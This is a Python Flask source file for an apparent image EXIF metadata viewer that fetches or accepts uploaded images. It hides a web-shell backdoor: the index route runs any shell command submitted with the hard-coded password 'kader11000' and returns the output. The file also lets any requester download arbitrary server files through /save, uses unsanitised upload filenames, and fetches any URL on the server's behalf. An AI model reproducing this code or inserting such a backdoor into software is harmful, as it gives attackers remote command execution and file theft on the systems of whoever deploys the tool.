from flask import Flask, request, render_template_string, send_file, redirect, url_for
from PIL import Image
from PIL.ExifTags import TAGS
import os, requests, subprocess

app = Flask(__name__)
UPLOAD_FOLDER = "dump"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

TEMPLATE = open("template.html", encoding="utf-8").read()

def get_exif_data(image_path):
    try:
        image = Image.open(image_path)
        info = image._getexif()
        exif_data = {}
        if info:
            for tag, value in info.items():
                tagname = TAGS.get(tag, tag)
                exif_data[tagname] = value
        return exif_data
    except Exception as e:
        return {"Error": str(e)}

@app.route("/", methods=["GET", "POST"])
def index():
    exif = {}
    output = ""
    image_path = ""
    if request.method == "POST":
        image_url = request.form.get("image_url")
        uploaded = request.files.get("image")
        if image_url:
            filename = os.path.basename(image_url)
            image_path = os.path.join(UPLOAD_FOLDER, filename)
            r = requests.get(image_url)
            with open(image_path, "wb") as f:
                f.write(r.content)
        elif uploaded:
            filename = uploaded.filename
            image_path = os.path.join(UPLOAD_FOLDER, filename)
            uploaded.save(image_path)

        if image_path:
            exif = get_exif_data(image_path)
            exif["vu"] = "enable_terminal"
            if "run_command" in request.form:
                password = request.form.get("password")
                if password == "kader11000":
                    command = request.form.get("command")
                    try:
                        result = subprocess.check_output(command, shell=True, text=True, timeout=10)
                        output = result
                    except Exception as e:
                        output = str(e)

    return render_template_string(TEMPLATE, exif=exif, output=output, image_path=image_path)

@app.route("/save", methods=["POST"])
def save_image():
    image_path = request.form.get("image_path")
    if image_path and os.path.exists(image_path):
        return send_file(image_path, as_attachment=True)
    return "Image not found", 404

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
